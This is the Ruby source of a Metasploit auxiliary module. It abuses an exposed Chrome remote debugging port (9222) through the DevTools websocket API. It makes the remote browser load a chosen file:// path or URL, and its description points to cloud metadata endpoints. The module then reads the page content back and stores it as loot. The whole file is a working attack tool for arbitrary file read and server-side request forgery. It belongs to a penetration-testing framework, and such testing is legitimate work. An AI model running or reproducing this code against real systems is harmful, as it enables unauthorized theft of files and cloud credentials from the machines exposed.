##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'eventmachine'
require 'faye/websocket'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Chrome Debugger Arbitrary File Read / Arbitrary Web Request',
      'Description' => %q{
        This module uses the Chrome Debugger's API to read
        files off the remote file system, or to make web requests
        from a remote machine.  Useful for cloud metadata endpoints!
      },
      'Author' => [
        'Adam Baldwin (Evilpacket)', # Original ideas, research, proof of concept, and msf module
        'Nicholas Starke (The King Pig Demon)' # msf module
      ],
      'DisclosureDate' => '2019-09-24',
      'License' => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(9222),
        OptString.new('FILEPATH', [false, 'File to fetch from remote machine.']),
        OptString.new('URL', [false, 'Url to fetch from remote machine.']),
        OptInt.new('TIMEOUT', [true, 'Time to wait for response', 10])
      ]
    )

    deregister_options('Proxies')
    deregister_options('VHOST')
    deregister_options('SSL')
  end

  def run
    if (datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?) && (datastore['URL'].nil? || datastore['URL'].empty?)
      print_error('Must set FilePath or Url')
      return
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => '/json'
    })

    if res.nil?
      print_error('Bad Response')
      return
    end

    data = JSON.parse(res.body).pop
    EM.run do
      file_path = datastore['FILEPATH']
      url = datastore['URL']

      if file_path
        fetch_uri = "file://#{file_path}"
      else
        fetch_uri = url
      end

      print_status("Attempting Connection to #{data['webSocketDebuggerUrl']}")

      unless data.key?('webSocketDebuggerUrl')
        fail_with(Failure::Unknown, 'Invalid JSON')
      end

      driver = Faye::WebSocket::Client.new(data['webSocketDebuggerUrl'])

      driver.on :open do
        print_status('Opened connection')
        id = rand(1024 * 1024 * 1024)

        @succeeded = false

        EM::Timer.new(1) do
          print_status("Attempting to load url #{fetch_uri}")
          driver.send({
            'id' => id,
            'method' => 'Page.navigate',
            'params' => {
              url:  fetch_uri
            }
          }.to_json)
        end

        EM::Timer.new(3) do
          print_status('Sending request for data')
          driver.send({
            'id' => id + 1,
            'method' => 'Runtime.evaluate',
            'params' => {
              'expression' => 'document.documentElement.outerHTML'
            }
          }.to_json)
        end
      end

      driver.on :message do |event|
        print_status('Received Data')

        data = JSON.parse(event.data)

        if data['result']['result']
          loot_path = store_loot('chrome.debugger.resource', 'text/plain', rhost, data['result']['result']['value'], fetch_uri, 'Resource Gathered via Chrome Debugger')
          print_good("Stored #{fetch_uri} at #{loot_path}")
          @succeeded = true
        end
      end

      EM::Timer.new(datastore['TIMEOUT']) do
        EventMachine.stop
        fail_with(Failure::Unknown, 'Unknown failure occurred') unless @succeeded
      end
    end
  end
end
